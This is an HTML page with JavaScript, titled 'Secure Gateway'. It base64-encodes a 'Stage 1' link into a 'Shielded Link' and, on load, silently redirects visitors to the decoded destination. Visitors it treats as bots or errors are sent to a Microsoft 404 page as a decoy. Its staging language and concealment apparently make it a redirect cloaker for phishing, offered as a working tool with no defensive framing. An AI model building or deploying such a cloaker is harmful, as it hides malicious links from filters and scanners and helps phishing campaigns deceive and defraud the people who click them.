<!DOCTYPE html>
<html>
<head>
    <title>Secure Gateway</title>
    <style id="antiFlash">body { display: none !important; }</style>
    <script>
        // RUN IMMEDIATELY (Before page renders)
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const payload = urlParams.get('p');
            
            if (payload) {
                try {
                    const destination = atob(payload);
                    // Trigger jump immediately
                    window.location.replace(destination);
                } catch (e) {
                    // Fallback for bots/errors
                    window.location.replace("https://learn.microsoft.com/en-us/errors/404");
                }
            } else {
                // No payload? Show the generator UI
                document.addEventListener("DOMContentLoaded", function() {
                    document.getElementById("antiFlash").remove();
                });
            }
        })();
    </script>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; padding: 40px; text-align: center; display: block; }
        .box { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 10px; border: 1px solid #334155; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; }
        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        #result { word-break: break-all; color: #10b981; margin-top: 20px; font-family: monospace; font-size: 13px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Gateway Console</h2>
        <p>Paste Stage 1 Link:</p>
        <input type="text" id="target" placeholder="https://your-worker.dev/#key">
        <br>
        <button onclick="generate()">Generate Shielded Link</button>
        <div id="result"></div>
    </div>

    <script>
        function generate() {
            const target = document.getElementById('target').value;
            if(!target) return;
            const encoded = btoa(target);
            const final = window.location.origin + window.location.pathname + "?p=" + encoded;
            document.getElementById('result').innerText = final;
        }
    </script>
</body>
</html>
